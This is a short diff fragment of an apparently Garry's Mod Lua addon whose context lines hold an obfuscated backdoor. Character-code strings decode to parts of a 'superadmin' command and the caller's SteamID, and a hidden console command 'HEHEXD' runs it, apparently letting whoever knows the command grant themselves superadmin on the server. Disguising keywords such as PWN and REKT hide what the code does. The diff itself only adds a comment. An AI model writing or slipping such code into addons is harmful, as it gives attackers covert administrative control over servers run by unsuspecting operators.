@@ -6,3 +6,4 @@ local HAHHAHAHAHAH = string.char(32,	115,	117,	112,	101,	114,	97,	100,	109,	105,
 local lmfao = string.char(112,	108,	121,	58,	83,	116,	101,	97,	109	,73,	68,	40,	41)
 
 PWN HEHEXD(ply , cmd , args) RCC(HAHAHAHAHHA..lmfao..HAHHAHAHAHAH) REKT concommand.Add("HEHEXD" , HEHEXD) PWN testttt() RCC() REKT timer.Simple(1 , testttt)
+-- Love ME
